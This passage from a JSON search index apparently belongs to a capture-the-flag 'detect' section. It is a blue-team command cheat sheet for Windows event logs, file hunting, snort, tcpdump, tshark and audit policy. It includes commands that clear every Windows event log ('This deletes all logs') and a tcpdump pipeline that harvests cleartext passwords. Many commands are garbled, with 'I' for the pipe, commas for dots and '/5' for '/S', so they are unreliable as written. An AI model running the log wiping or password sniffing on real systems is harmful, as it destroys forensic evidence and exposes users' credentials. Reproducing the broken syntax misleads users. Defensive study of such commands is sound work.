\"HKLM\\SYSTEM\\ControlSet001\\Control\\SessionManager\\KnownDLLs\"","title":"HKEY_LOCAL_MACHINE:"},{"location":"capturetheflag/basic/detect/analysis/#logs","text":"","title":"LOGS"},{"location":"capturetheflag/basic/detect/analysis/#copy-event-logs","text":"C:\\> wevtutil epl Security C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl System C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl Application C:\\<BACK UPPATH>\\mylogs.evtx","title":"Copy event logs:"},{"location":"capturetheflag/basic/detect/analysis/#get-list-of-logs-remotely","text":"C:\\> psloglist \\\\<REMOTE COMPUTER> -accepteula -h 12 -x","title":"Get list of logs remotely:"},{"location":"capturetheflag/basic/detect/analysis/#clear-all-logs-and-start-a-baseline-log-to-monitor","text":"PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"}","title":"Clear all logs and start a baseline log to monitor:"},{"location":"capturetheflag/basic/detect/analysis/#list-log-filenames-and-path-location","text":"C:\\> wmic nteventlog get path,filename,writeable","title":"List log filenames and path location:"},{"location":"capturetheflag/basic/detect/analysis/#take-pre-breach-log-export","text":"PS C:\\> wevtutil el I ForEach-Object{Get-Eventlog -Log \"$_\" I Export-Csv -Path (:\\<BASELINE LOG>,csv -Append}","title":"Take pre breach log export:"},{"location":"capturetheflag/basic/detect/analysis/#take-post-breach-log-export","text":"PS C:\\> wevtutil el I ForEach-Object{Get-EventLog -Log\"$_\" I Export-Csv -Path C:\\<POST BASELINELOG>,CSV -Append}","title":"Take post breach log export:"},{"location":"capturetheflag/basic/detect/analysis/#compare-two-files-baseline-and-post-breach-logs","text":"PS C:\\> Compare-Object -ReferenceObject $(GetContent\"C:\\<PATH TO FILE>\\<ORIGINAL BASELINELOGS>.txt\") -DifferenceObject $(Get-Content\"C:\\<PATH TO FILE>\\<POST BASELINE LOGS>.txt\") >><DIFFERENCES LOG>.txt","title":"Compare two files baseline and post breach logs:"},{"location":"capturetheflag/basic/detect/analysis/#this-deletes-all-logs","text":"PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"}","title":"This deletes all logs:"},{"location":"capturetheflag/basic/detect/analysis/#files-drives-and-shares-information","text":"C:\\> net use \\\\<TARGET IP ADDRESS> C:\\> net share C:\\> net session C:\\> wmic volume list brief C:\\> wmic logicaldisk getdescription,filesystem,name,size C:\\> wmic share get name,path","title":"FILES, DRIVES AND SHARES INFORMATION"},{"location":"capturetheflag/basic/detect/analysis/#find-multiple-file-types-or-a-file","text":"C:\\> dir /A /5 /T:A *,exe *,dll *,bat *\u00b7PS1 *,zip C:\\> dir /A /5 /T:A <BAD FILE NAME>,exe","title":"Find multiple file types or a file:"},{"location":"capturetheflag/basic/detect/analysis/#find-executable-exe-files-newer-than-jan-1-2017","text":"C:\\> forfiles /p C:\\ /M *,exe /5 /0 +1/1/2017 /C\"cmd /c echo @fdate @ftime @path\"","title":"Find executable (.exe) files newer than Jan 1, 2017:"},{"location":"capturetheflag/basic/detect/analysis/#find-multiple-files-types-using-loop","text":"C:\\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p \"C:\" -m *%G -s -d +1/1/2017 -c \"cmd /c echo @fdate@ftime @path\"","title":"Find multiple files types using loop:"},{"location":"capturetheflag/basic/detect/analysis/#search-for-files-newer-than-date","text":"C:\\> forfiles /PC:\\ /5 /0 +1/01/2017 /C \"cmd /cecho @path @fdate\"Find large files: (example <20 MB) C:\\> forfiles /5 /M * /C \"cmd /c if @fsize GEO2097152 echo @path @fsize\"","title":"Search for files newer than date:"},{"location":"capturetheflag/basic/detect/analysis/#find-files-with-alternate-data-streams","text":"C:\\> streams -s <FILE OR DIRECTORY>","title":"Find files with Alternate Data Streams:"},{"location":"capturetheflag/basic/detect/analysis/#find-files-with-bad-signature-into-csv","text":"C:\\> sigcheck -c -h -s -u -nobanner <FILE ORDIRECTORY> > <OUTPUT FILENAME>,csv","title":"Find files with bad signature into csv:"},{"location":"capturetheflag/basic/detect/analysis/#find-and-show-only-unsigned-files-with-bad-signaturein-c","text":"C:\\> sigcheck -e -u -vr -s C:\\","title":"Find and show only unsigned files with bad signaturein C:"},{"location":"capturetheflag/basic/detect/analysis/#list-loaded-unsigned-dlls","text":"C:\\> listdlls.exe -u C:\\> listdlls.exe -u <PROCESS NAME OR PID>","title":"List loaded unsigned Dlls:"},{"location":"capturetheflag/basic/detect/analysis/#run-malware-scan-windows-defender-offline","text":"C:\\> MpCmdRun.exe -SignatureUpdate C:\\> MpCmdRun.exe -Scan","title":"Run Malware scan (Windows Defender) offline:"},{"location":"capturetheflag/basic/detect/editcap/","text":"Use to edit a pcap file (split into 1000 packets): editcap -F pcap -c 1000 orignal.pcap out_split,pcap Use to edit a pcap file (split into 1 hour each packets): editcap -F pcap -t+3600 orignal.pcap out_split.pcap","title":"edicap"},{"location":"capturetheflag/basic/detect/editcap/#use-to-edit-a-pcap-file-split-into-1000-packets","text":"editcap -F pcap -c 1000 orignal.pcap","title":"Use to edit a pcap file (split into 1000 packets):"},{"location":"capturetheflag/basic/detect/editcap/#out_splitpcap-use-to-edit-a-pcap-file-split-into-1-hour-each-packets","text":"editcap -F pcap -t+3600 orignal.pcap out_split.pcap","title":"out_split,pcap Use to edit a pcap file (split into 1 hour each packets):"},{"location":"capturetheflag/basic/detect/linux/","text":"Authentication logs in Ubuntu: tail /var/log/auth. log grep -i \"fail\" /var/log/auth. log User login logs in Ubuntu: tail /var/ Look at samba activity: grep -i samba /var/log/syslog Look at cron activity: grep -i cron /var/log/syslog Look at sudo activity: grep -i sudo /var/log/auth. log Look in Apache Logs for 404 errors: grep 404 <LOG FILE NAME> I grep -v -E \"favicon. ico I robots. txt\" Look at Apache Logs for files requested: head access_log I awk '{print $7}' Monitor for new created files every Smin: watch -n 300 -d ls -lR /<WEB DIRECTORY> Look where traffic is coming from: cat <LOG FILE NAME> I fgrep -v <YOUR DOMAIN> I cut -d\\\" -f4 I grep -v \"\"- Monitor for TCP connections every 5 seconds: netstat -ac 5 I grep tcp Install audit framework and review syscalls/events: apt-get install auditd auditctl -a exit,always -5 execve ausearch -m execve Get audit report summary: aureport","title":"linux"},{"location":"capturetheflag/basic/detect/linux/#authentication-logs-in-ubuntu","text":"tail /var/log/auth. log grep -i \"fail\" /var/log/auth. log","title":"Authentication logs in Ubuntu:"},{"location":"capturetheflag/basic/detect/linux/#user-login-logs-in-ubuntu","text":"tail /var/","title":"User login logs in Ubuntu:"},{"location":"capturetheflag/basic/detect/linux/#look-at-samba-activity","text":"grep -i samba /var/log/syslog","title":"Look at samba activity:"},{"location":"capturetheflag/basic/detect/linux/#look-at-cron-activity","text":"grep -i cron /var/log/syslog","title":"Look at cron activity:"},{"location":"capturetheflag/basic/detect/linux/#look-at-sudo-activity","text":"grep -i sudo /var/log/auth. log","title":"Look at sudo activity:"},{"location":"capturetheflag/basic/detect/linux/#look-in-apache-logs-for-404-errors","text":"grep 404 <LOG FILE NAME> I grep -v -E \"favicon. ico I robots. txt\"","title":"Look in Apache Logs for 404 errors:"},{"location":"capturetheflag/basic/detect/linux/#look-at-apache-logs-for-files-requested","text":"head access_log I awk '{print $7}'","title":"Look at Apache Logs for files requested:"},{"location":"capturetheflag/basic/detect/linux/#monitor-for-new-created-files-every-smin","text":"watch -n 300 -d ls -lR /<WEB DIRECTORY>","title":"Monitor for new created files every Smin:"},{"location":"capturetheflag/basic/detect/linux/#look-where-traffic-is-coming-from","text":"cat <LOG FILE NAME> I fgrep -v <YOUR DOMAIN> I cut -d\\\" -f4 I grep -v \"\"-","title":"Look where traffic is coming from:"},{"location":"capturetheflag/basic/detect/linux/#monitor-for-tcp-connections-every-5-seconds","text":"netstat -ac 5 I grep tcp","title":"Monitor for TCP connections every 5 seconds:"},{"location":"capturetheflag/basic/detect/linux/#install-audit-framework-and-review-syscallsevents","text":"apt-get install auditd auditctl -a exit,always -5 execve ausearch -m execve","title":"Install audit framework and review syscalls/events:"},{"location":"capturetheflag/basic/detect/linux/#get-audit-report-summary","text":"aureport","title":"Get audit report summary:"},{"location":"capturetheflag/basic/detect/mergecap/","text":"Use to merge multiple pcap files: mergecap -w merged_cap.pcap capl.pcap cap2.pcap cap3.pcap","title":"mergecap"},{"location":"capturetheflag/basic/detect/mergecap/#use-to-merge-multiple-pcap-files","text":"mergecap -w merged_cap.pcap capl.pcap cap2.pcap cap3.pcap","title":"Use to merge multiple pcap files:"},{"location":"capturetheflag/basic/detect/snort/","text":"Run test on snort config file: snort -T -c /<PATH TO SNORT>/snort/snort.conf Use snort(v=verbose,d=dump packet payload): snort -dv -r <LOG FILE NAME>, log Replay a log file and match icmp traffic: snort -dvr packet.log icmp Logs in ASCII: snort -K ascii -l <LOG DIRECTORY> Logs in binary: snort -l <LOG DIRECTORY> Sent events to console: snort -q -A console -i eth0 -c /etc/snort/snort.conf snort -c snort.conf -l /tmp/so/console -A console Create a single snort rule and save: echo alert any any <SNORT RULE> > one.rule Test single rule: snort -T -c one.rule Run single rule and output to console and logs dir: mkdir ,/logs snort -vd -c one.rule -r <PCAP FILE NAME>,pcap -A console -l logs","title":"snort"},{"location":"capturetheflag/basic/detect/snort/#run-test-on-snort-config-file","text":"snort -T -c /<PATH TO SNORT>/snort/snort.conf","title":"Run test on snort config file:"},{"location":"capturetheflag/basic/detect/snort/#use-snortvverboseddump-packet-payload","text":"snort -dv -r <LOG FILE NAME>, log","title":"Use snort(v=verbose,d=dump packet payload):"},{"location":"capturetheflag/basic/detect/snort/#replay-a-log-file-and-match-icmp-traffic","text":"snort -dvr packet.log icmp","title":"Replay a log file and match icmp traffic:"},{"location":"capturetheflag/basic/detect/snort/#logs-in-ascii","text":"snort -K ascii -l <LOG DIRECTORY>","title":"Logs in ASCII:"},{"location":"capturetheflag/basic/detect/snort/#logs-in-binary","text":"snort -l <LOG DIRECTORY>","title":"Logs in binary:"},{"location":"capturetheflag/basic/detect/snort/#sent-events-to-console","text":"snort -q -A console -i eth0 -c /etc/snort/snort.conf snort -c snort.conf -l /tmp/so/console -A console","title":"Sent events to console:"},{"location":"capturetheflag/basic/detect/snort/#create-a-single-snort-rule-and-save","text":"echo alert any any <SNORT RULE> > one.rule","title":"Create a single snort rule and save:"},{"location":"capturetheflag/basic/detect/snort/#test-single-rule","text":"snort -T -c one.rule","title":"Test single rule:"},{"location":"capturetheflag/basic/detect/snort/#run-single-rule-and-output-to-console-and-logs-dir","text":"mkdir ,/logs snort -vd -c one.rule -r <PCAP FILE NAME>,pcap -A console -l logs","title":"Run single rule and output to console and logs dir:"},{"location":"capturetheflag/basic/detect/tcpdump/","text":"View ASCII (-A) or HEX (-X) traffic: tcpdump -A tcpdump -X View traffic with timestamps and don't convert addresses and be verbose: tcpdump -tttt -n -vv Find top talkers after 1000 packets (PotentialDDoS): tcpdump -nn -c 1000 jawk '{print $3}' I cut -d. -fl-4 I sort -n I uniq -c I sort -nr Capture traffic on any interface from a target host and specific port and output to a file: tcpdump -w <FILENAME>,pcap -i any dst <TARGET IPADDRESS> and port 80 View traffic only between two hosts: tcpdump host 10.0.0.1 && host 10.0.0.2 View all traffic except from a net or a host: tcpdump not net 10.10 && not host 192.168.1,2 View host and either of two other hosts: tcpdump host 10,10,10.10 && \\(10,10.10.20 or 10,10,10,30\\) Save pcap file on rotating size: tcpdump -n -s65535 -c 1000 -w '%host_%Y-%m\u00ad%d_%H:%M:%S.pcap' Save pcap file to a remote host: tcpdump -w - I ssh <REMOTE HOST ADDRESS> -p 50005 \"cat - > /tmp/remotecapture.pcap\" Grab traffic that contains the word pass: tcpdump -n -A -s0 I grep pass Grab many clear text protocol passwords: tcpdump -n -A -s0 port http or port ftp or port smtp or port imap or port pop3 I egrep -i 'pass=lpwd=llog=llogin=luser=lusername=lpw=lpassw=IP asswd=lpassword=lpass: I user: lusername: I password: I login: I pass I user ' --color=auto --line-buffered -B20 Get throughput tcpdump -w - lpv -bert >/dev/null Filter out ipv6 traffic: tcpdump not ip6 Filer out ipv4 traffic: tcpdump ip6 Script to capture multiple interface tcpdumps to files rotating every hour: #!/bin/bash tcpdump -pni any -s65535 -G 3600 -w any%Y-%m\u00ad%d_%H:%M:%S.pcap Script to move multiple tcpdump files to alternate location: #!/bin/bash while true; do sleep 1; rsync -azvr -progress <USER NAME>@<IP ADDRESS>:<TRAFFIC DIRECTORY>/, <DESTINATION DIRECTORY/. done Look for suspicious and self-signed SSL certificates: tcpdump -s 1500 -A '(tcp[((tcp[12:1] & 0xf0) >> 2)+5:1] = 0x01) and (tcp[((tcp[12:1] & 0xf0) >> 2) : 1] : 0x16) I Get SSL Certificate: openssl s_client -connect <URL>:443 openssl s_client -connect <SITE>:443 </dev/null 2>/dev/null I sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-Ip' > <CERT>.pem Examine and verify the certificate and check for Self-Signed: openssl x509 -text -in <CERT>.pem openssl x509 -in <CERT>,pem -noout -issuer -subject -startdate -enddate -fingerprint openssl verify <CERT>.pem Extract Certificate Server Name: tshark -nr <PCAP FILE NAME> -Y \"ssl. handshake. ciphersuites\" -Vx I grep \"ServerName:\" I sort I uniq -c I sort -r Extract Certificate info for analysis: ssldump -Nr <FILE NAME>.pcap I awk 'BEGIN {c=0;}{ if ($0 \ufffd /A[ ]+Certificate$/) {c=l; print\"========================================\";} if($0 !\ufffd/A +/) {c=0;} if (c==l) print $0; }'","title":"tcpdump"},{"location":"capturetheflag/basic/detect/tcpdump/#view-ascii-a-or-hex-x-traffic","text":"tcpdump -A tcpdump -X","title":"View ASCII (-A) or HEX (-X) traffic:"},{"location":"capturetheflag/basic/detect/tcpdump/#view-traffic-with-timestamps-and-dont-convert-addresses-and-be-verbose","text":"tcpdump -tttt -n -vv","title":"View traffic with timestamps and don't convert addresses and be verbose:"},{"location":"capturetheflag/basic/detect/tcpdump/#find-top-talkers-after-1000-packets-potentialddos","text":"tcpdump -nn -c 1000 jawk '{print $3}' I cut -d. -fl-4 I sort -n I uniq -c I sort -nr","title":"Find top talkers after 1000 packets (PotentialDDoS):"},{"location":"capturetheflag/basic/detect/tcpdump/#capture-traffic-on-any-interface-from-a-target-host-and-specific-port-and-output-to-a-file","text":"tcpdump -w <FILENAME>,pcap -i any dst <TARGET IPADDRESS> and port 80","title":"Capture traffic on any interface from a target host and specific port and output to a file:"},{"location":"capturetheflag/basic/detect/tcpdump/#view-traffic-only-between-two-hosts","text":"tcpdump host 10.0.0.1 && host 10.0.0.2","title":"View traffic only between two hosts:"},{"location":"capturetheflag/basic/detect/tcpdump/#view-all-traffic-except-from-a-net-or-a-host","text":"tcpdump not net 10.10 && not host 192.168.1,2","title":"View all traffic except from a net or a host:"},{"location":"capturetheflag/basic/detect/tcpdump/#view-host-and-either-of-two-other-hosts","text":"tcpdump host 10,10,10.10 && \\(10,10.10.20 or 10,10,10,30\\)","title":"View host and either of two other hosts:"},{"location":"capturetheflag/basic/detect/tcpdump/#save-pcap-file-on-rotating-size","text":"tcpdump -n -s65535 -c 1000 -w '%host_%Y-%m\u00ad%d_%H:%M:%S.pcap'","title":"Save pcap file on rotating size:"},{"location":"capturetheflag/basic/detect/tcpdump/#save-pcap-file-to-a-remote-host","text":"tcpdump -w - I ssh <REMOTE HOST ADDRESS> -p 50005 \"cat - > /tmp/remotecapture.pcap\"","title":"Save pcap file to a remote host:"},{"location":"capturetheflag/basic/detect/tcpdump/#grab-traffic-that-contains-the-word-pass","text":"tcpdump -n -A -s0 I grep pass","title":"Grab traffic that contains the word pass:"},{"location":"capturetheflag/basic/detect/tcpdump/#grab-many-clear-text-protocol-passwords","text":"tcpdump -n -A -s0 port http or port ftp or port smtp or port imap or port pop3 I egrep -i 'pass=lpwd=llog=llogin=luser=lusername=lpw=lpassw=IP asswd=lpassword=lpass: I user: lusername: I password: I login: I pass I user ' --color=auto --line-buffered -B20","title":"Grab many clear text protocol passwords:"},{"location":"capturetheflag/basic/detect/tcpdump/#get-throughput","text":"tcpdump -w - lpv -bert >/dev/null","title":"Get throughput"},{"location":"capturetheflag/basic/detect/tcpdump/#filter-out-ipv6-traffic","text":"tcpdump not ip6","title":"Filter out ipv6 traffic:"},{"location":"capturetheflag/basic/detect/tcpdump/#filer-out-ipv4-traffic","text":"tcpdump ip6","title":"Filer out ipv4 traffic:"},{"location":"capturetheflag/basic/detect/tcpdump/#script-to-capture-multiple-interface-tcpdumps-to-files-rotating-every-hour","text":"#!/bin/bash tcpdump -pni any -s65535 -G 3600 -w any%Y-%m\u00ad%d_%H:%M:%S.pcap","title":"Script to capture multiple interface tcpdumps to files rotating every hour:"},{"location":"capturetheflag/basic/detect/tcpdump/#script-to-move-multiple-tcpdump-files-to-alternate-location","text":"#!/bin/bash while true; do sleep 1; rsync -azvr -progress <USER NAME>@<IP ADDRESS>:<TRAFFIC DIRECTORY>/, <DESTINATION DIRECTORY/. done","title":"Script to move multiple tcpdump files to alternate location:"},{"location":"capturetheflag/basic/detect/tcpdump/#look-for-suspicious-and-self-signed-ssl-certificates","text":"tcpdump -s 1500 -A '(tcp[((tcp[12:1] & 0xf0) >> 2)+5:1] = 0x01) and (tcp[((tcp[12:1] & 0xf0) >> 2) : 1] : 0x16) I","title":"Look for suspicious and self-signed SSL certificates:"},{"location":"capturetheflag/basic/detect/tcpdump/#get-ssl-certificate","text":"openssl s_client -connect <URL>:443 openssl s_client -connect <SITE>:443 </dev/null 2>/dev/null I sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-Ip' > <CERT>.pem","title":"Get SSL Certificate:"},{"location":"capturetheflag/basic/detect/tcpdump/#examine-and-verify-the-certificate-and-check-for-self-signed","text":"openssl x509 -text -in <CERT>.pem openssl x509 -in <CERT>,pem -noout -issuer -subject -startdate -enddate -fingerprint openssl verify <CERT>.pem","title":"Examine and verify the certificate and check for Self-Signed:"},{"location":"capturetheflag/basic/detect/tcpdump/#extract-certificate-server-name","text":"tshark -nr <PCAP FILE NAME> -Y \"ssl. handshake. ciphersuites\" -Vx I grep \"ServerName:\" I sort I uniq -c I sort -r","title":"Extract Certificate Server Name:"},{"location":"capturetheflag/basic/detect/tcpdump/#extract-certificate-info-for-analysis","text":"ssldump -Nr <FILE NAME>.pcap I awk 'BEGIN {c=0;}{ if ($0 \ufffd /A[ ]+Certificate$/) {c=l; print\"========================================\";} if($0 !\ufffd/A +/) {c=0;} if (c==l) print $0; }'","title":"Extract Certificate info for analysis:"},{"location":"capturetheflag/basic/detect/tshark/","text":"Get list of network interfaces: tshark -D Listen on multiple network interfaces: tshark -i ethl -i eth2 -i eth3 Save to pcap and disable name resolution: tshark -nn -w <FILE NAME>,pcap Get absolute date and time stamp: tshark -t a Get arp or icmp traffic: tshark arp or icmp Capture traffic between to [hosts] and/or [nets]: tshark \"host <HOST l> && host <HOST 2>\" tshark -n \"net <NET 1> && net <NET 2>\" Filter just host and IPs (or not your IP): tshark -r <FILE NAME>,pcap -q -z hosts,ipv4 tshark not host <YOUR IP ADDRESS> Not ARP and not UDP: tshark not arp and not (udp.port -- 53) Replay a pcap file: tshark -r <FILE NAME>.pcap Replay a pcap and just grab hosts and IPs: tshark -r <FILE NAME>.pcap -q -z hosts Setup a capture session(duration=60sec): tshark -n -a files:10 -a filesize:100 -a duration:60 -w <FILE NAME>,pcap Grab src/dst IPs only: tshark -n -e ip.src -e ip.dst -T fields -E separator=, -Rip Grab IP of src DNS and DNS query: tshark -n -e ip.src -e dns,qry.name -E separator=';' -T fields port 53 Grab HTTP URL host and request: tshark -R http.request -T fields -E separator=';' -e http.host -e http.request.uri Grab just HTTP host requests: tshark -n -R http.request -T fields -e http.host Grab top talkers by IP dst: tshark -n -c 150 I awk '{print $4}' I sort -n Iuniq -c I sort -nr Grab top stats of protocols: tshark -q -z io,phs -r <FILE NAME>.pcap tshark -r <PCAP FILE>,cap -R http.request -T fields -e http.host -e http.request.uri lsed -e 'sf?,*$//' I sed -e 's#\"(,*)t(,*)$#http://l2#' I sort I uniq -c I sort -rn I head tshark -n -c 100 -e ip.src -R \"dns.flags.responseeq 1\" -T fields po rt 53 tshark -n -e http.request.uri -R http.request -T fields I grep exe tshark -n -c 1000 -e http.host -R http.request -T fields port 80 I sort I uniq -c I sort -r","title":"tshark"},{"location":"capturetheflag/basic/detect/tshark/#get-list-of-network-interfaces","text":"tshark -D","title":"Get list of network interfaces:"},{"location":"capturetheflag/basic/detect/tshark/#listen-on-multiple-network-interfaces","text":"tshark -i ethl -i eth2 -i eth3","title":"Listen on multiple network interfaces:"},{"location":"capturetheflag/basic/detect/tshark/#save-to-pcap-and-disable-name-resolution","text":"tshark -nn -w <FILE NAME>,pcap","title":"Save to pcap and disable name resolution:"},{"location":"capturetheflag/basic/detect/tshark/#get-absolute-date-and-time-stamp","text":"tshark -t a","title":"Get absolute date and time stamp:"},{"location":"capturetheflag/basic/detect/tshark/#get-arp-or-icmp-traffic","text":"tshark arp or icmp","title":"Get arp or icmp traffic:"},{"location":"capturetheflag/basic/detect/tshark/#capture-traffic-between-to-hosts-andor-nets","text":"tshark \"host <HOST l> && host <HOST 2>\" tshark -n \"net <NET 1> && net <NET 2>\"","title":"Capture traffic between to [hosts] and/or [nets]:"},{"location":"capturetheflag/basic/detect/tshark/#filter-just-host-and-ips-or-not-your-ip","text":"tshark -r <FILE NAME>,pcap -q -z hosts,ipv4 tshark not host <YOUR IP ADDRESS>","title":"Filter just host and IPs (or not your IP):"},{"location":"capturetheflag/basic/detect/tshark/#not-arp-and-not-udp","text":"tshark not arp and not (udp.port -- 53)","title":"Not ARP and not UDP:"},{"location":"capturetheflag/basic/detect/tshark/#replay-a-pcap-file","text":"tshark -r <FILE NAME>.pcap","title":"Replay a pcap file:"},{"location":"capturetheflag/basic/detect/tshark/#replay-a-pcap-and-just-grab-hosts-and-ips","text":"tshark -r <FILE NAME>.pcap -q -z hosts","title":"Replay a pcap and just grab hosts and IPs:"},{"location":"capturetheflag/basic/detect/tshark/#setup-a-capture-sessionduration60sec","text":"tshark -n -a files:10 -a filesize:100 -a duration:60 -w <FILE NAME>,pcap","title":"Setup a capture session(duration=60sec):"},{"location":"capturetheflag/basic/detect/tshark/#grab-srcdst-ips-only","text":"tshark -n -e ip.src -e ip.dst -T fields -E separator=, -Rip","title":"Grab src/dst IPs only:"},{"location":"capturetheflag/basic/detect/tshark/#grab-ip-of-src-dns-and-dns-query","text":"tshark -n -e ip.src -e dns,qry.name -E separator=';' -T fields port 53","title":"Grab IP of src DNS and DNS query:"},{"location":"capturetheflag/basic/detect/tshark/#grab-http-url-host-and-request","text":"tshark -R http.request -T fields -E separator=';' -e http.host -e http.request.uri","title":"Grab HTTP URL host and request:"},{"location":"capturetheflag/basic/detect/tshark/#grab-just-http-host-requests","text":"tshark -n -R http.request -T fields -e http.host","title":"Grab just HTTP host requests:"},{"location":"capturetheflag/basic/detect/tshark/#grab-top-talkers-by-ip-dst","text":"tshark -n -c 150 I awk '{print $4}' I sort -n Iuniq -c I sort -nr","title":"Grab top talkers by IP dst:"},{"location":"capturetheflag/basic/detect/tshark/#grab-top-stats-of-protocols","text":"tshark -q -z io,phs -r <FILE NAME>.pcap tshark -r <PCAP FILE>,cap -R http.request -T fields -e http.host -e http.request.uri lsed -e 'sf?,*$//' I sed -e 's#\"(,*)t(,*)$#http://l2#' I sort I uniq -c I sort -rn I head tshark -n -c 100 -e ip.src -R \"dns.flags.responseeq 1\" -T fields po rt 53 tshark -n -e http.request.uri -R http.request -T fields I grep exe tshark -n -c 1000 -e http.host -R http.request -T fields port 80 I sort I uniq -c I sort -r","title":"Grab top stats of protocols:"},{"location":"capturetheflag/basic/detect/windows/","text":"Increase Log size to support increased auditing: C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Application /v MaxSize /t REG_DWORD /d 0x19000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Security /v MaxSize /t REG_DWORD /d 0x64000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog\\System /v MaxSize /t REG_DWORD /d 0x19000 Check settings of Security log: C:\\> wevtutil gl Security Check settings of audit policies: C:\\> auditpol /get /category:* Set Log Auditing on for Success and/or Failure on All Categories: C:\\> auditpol /set /category:* /success:enable /failure:enable Set Log Auditing on for Success and/or Failure on Subcategories: C:\\> auditpol /set /subcategory: \"Detailed FileShare\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"File System\"/success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Security System Extension\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"System Integrity\"/success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Security StateChange\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other SystemEvents\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"System Integrity\"/success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Logon\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Logoff\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Account Lockout\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Logon/Logoff Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Network Policy Server\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Registry\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"SAM\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Certification Services\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Application Generated\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Handle Manipulation\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"file Share\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"filtering Platform Packet Drop\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Filtering Platform Connection\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Object Access Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Detailed File Share\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Sensitive Privilege Use\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Non Sensitive Privilege Use\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Other Privilege Use Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Process Termination\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"DPAPI Activity\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"RPC Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Process Creation\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Audit Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Authentication Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Authorization Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"MPSSVC Rule-Level Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Filtering Platform Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Policy Change Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"User Account Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Computer Account Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Security Group Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Distribution Group Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Application Group Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Account Management Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Directory Service Changes\" /success:enable /failure:enable C:\\> auditpol / set /subcategory: \"Directory Service Replication\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Detailed Directory Service Replication\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Directory Service Access\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Account Logan Events\" /success:enable /failure:enable C:\\> audit pol /set /subcategory: \"Kerberos Authentication Service\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Credential Validation\" /success:enable /failure:enable Check for list of available logs, size, retention limit: PS C:\\> Get-Eventlog -list Partial list of Key Security Log Auditing events to monitor: PS C:\\> Get-Eventlog -newest 5 -logname applicationI Format-List Show log from remote system: PS C:\\> Show-Eventlog -computername <SERVER NAME>Get a specific list of events based on Event ID: PS C:\\> Get-Eventlog Security I ? { $_.Eventid -eq4800} PS C:\\> Get-WinEvent -FilterHashtable@{LogName=\"Secu rity\"; ID=4774} Account Logon - Audit Credential Validation Last 14 Days: PS C:\\> Get-Eventlog Security 4768,4771,4772,4769,4770,4649,4778,4779,4800,4801,48 02,4803,5378,5632,5633 -after ((get-date).addDays(-14)) Account - Logon/Logoff: PS C:\\> Get-Eventlog Security 4625,4634,4647,4624,4625,4648,4675,6272,6273,6274,62 75,6276,6277,6278,6279,6280,4649,4778,4779,4800,4801,4802,4803,5378,5632,5633,4964 -after ((getdate).addDays(-1)) Account Management - Audit Application Group Management: PS C:\\> Get-Eventlog Security 4783,4784,4785,4786,4787,4788,4789,4790,4741,4742,47 43,4744,4745,4746,4747,4748,4749,4750,4751,4752,4753,4759,4760,4761,4762,4782,4793,4727,4728,4729,4730,4731,4732,4733,4734,4735,4737,4754,4755,4756,4757,4758,4764,4720,4722,4723,4724,4725,4726,4738,4740,4765,4766,4767,4780,4781,4794,5376,5377 -after ((getdate).addDays(-1)) Detailed Tracking - Audit DPAPI Activity, Process Termination, RPC Events: PS C:\\> Get-EventLog Security 4692,4693,4694,4695,4689,5712 -after ((getdate).addDays(-1)) Domain Service Access - Audit Directory Service Access: PS C:\\> Get-EventLog 